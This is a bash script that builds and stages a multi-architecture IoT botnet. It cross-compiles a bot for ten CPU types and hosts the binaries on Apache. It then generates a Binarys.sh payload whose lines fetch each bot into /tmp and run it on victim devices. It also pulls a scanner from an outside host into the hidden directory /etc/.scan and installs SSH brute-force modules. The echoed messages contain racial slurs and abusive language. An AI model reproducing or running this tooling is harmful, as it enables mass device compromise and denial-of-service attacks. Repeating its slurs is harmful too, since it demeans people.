#!/bin/bash

#########################################
###############Botnames##################
#########################################
L1='jackmymipsel' #mipsel
L2='jackmymips'  #mips
L3='jackmysh4'    #sh4
L4='jackmyx86' #x86_64
L5='jackmyarmv6' #armv6l
L6='jackmyi686'   #i686
L7='jackmypowerpc'  #powerpc
L8='jackmyi586'  #i586
L9='jackmym86k'  #m86k
L10='jackmysparc'  #sparc

#########################################
##############Wgetlinks##################
#########################################
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'
ppc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'
echo "Clearout If you didnt type NSA.sh NewK.c I will fucking hang you!"
sleep 5
$myip="curl icanhazip.com"

#########################################
################Wgetting#################
#########################################
if [ -d cross-compiler-mips ]
then
echo -e "\e[1;32mcross-compiler-mips is present, no need for wget"
else
wget $mips
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[0;36mcross-compiler-mipsel is present, no need for wget"
else
wget $mipsel
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[1;32mcross-compiler-sh4 is present, no need for wget"
else
wget $sh4
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[0;36mcross-compiler-x86_64 is present, no need for wget"
else
wget $x86_64
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[1;32mcross-compiler-armv6l is present, no need for wget"
else
wget $armv6l
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[1;32mcross-compiler-powerpc is present, no need for wget"
else
wget $ppc
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[1;32mcross-compiler-m68k is present, no need for wget"
else
wget $m68k
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[1;32mcross-compiler-sparc is present, no need for wget"
else
wget $sparc
tar -xvjf cross-compiler-sparc*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[1;32mcross-compiler-i586 is present, no need for wget"
else
wget $i586
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[0;36mcross-compiler-i686 is present, no need for wget"
else
wget $i686
tar -xvjf cross-compiler-i686*
fi
rm -rf *.tar.bz2
echo " "
echo -e "\e[1;35mDone, You Lazy fucking nigger."
sleep 3

#########################################
##############Compiling#################
#########################################
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -DMIPSEL -o $L1 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $L2 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $L3 $1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx86_64 -o $L4 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -Darmv6l -o $L5 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $L6 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dpowerpc -o $L7 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -Di586 -o $L8 $1 > /dev/null 2>&1
./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o $L9 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $L10 $1 > /dev/null 2>&1
apt-get install apache2; apt-get install php5 -y -q
yum install httpd; yum install php -y -q
mkdir /var/www/html/DOGDICKS/
mv jackmy* /var/www/html/DOGDICKS/
echo -e "\e[1;35mRestarting your apache nigger..."
service httpd restart
service apache2 restart

#########################################
#########Setting up Binarys.sh###########
#########################################
echo -e "\e[1;35mMaking payload..."
cd /var/www/html/DOGDICKS/; touch Binarys.sh

echo -e "\e[1;35mThis will take a few., be patient.."
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L1 && chmod +x $L1 && ./$L1">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L2 && chmod +x $L2 && ./$L2">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L3 && chmod +x $L3 && ./$L3">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L4 && chmod +x $L4 && ./$L4">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L5 && chmod +x $L5 && ./$L5">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L6 && chmod +x $L6 && ./$L6">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L7 && chmod +x $L7 && ./$L7">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L8 && chmod +x $L8 && ./$L8">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L9 && chmod +x $L9 && ./$L9">> Binarys.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/DOGDICKS/$L10 && chmod +x $L10 && ./$L10">> Binarys.sh


#########################################
######Installing mods for scanning#######
#########################################
echo -e "\e[1;35mInstalling dependencies for scanning"
echo -e "\e[1;35mScanner can be found in /etc/.scan"
sleep 6
echo -e "\e[1;35mFinishing up install...."
mkdir /etc/.scan
cd /etc/.scan
wget -q http://miku.li/scan.zip
unzip scan.zip
yum install cpan wget curl glibc.i686 -y
cpan force install Parallel::ForkManager
cpan force install IO::Socket
cpan force install IO::Select
sleep 2
yum install gcc php-devel php-pear libssh2 libssh2-devel
pecl install -f ssh2
touch /etc/php.d/ssh2.ini
echo extension=ssh2.so > /etc/php.d/ssh2.ini
cpan force install Net::SSH2
#########################################
###############Credz#####################
#########################################
echo -e "\e[1;35mRe-made by Zone Hax For That Fat Fuck Clearout ; Skype:Zone_hax
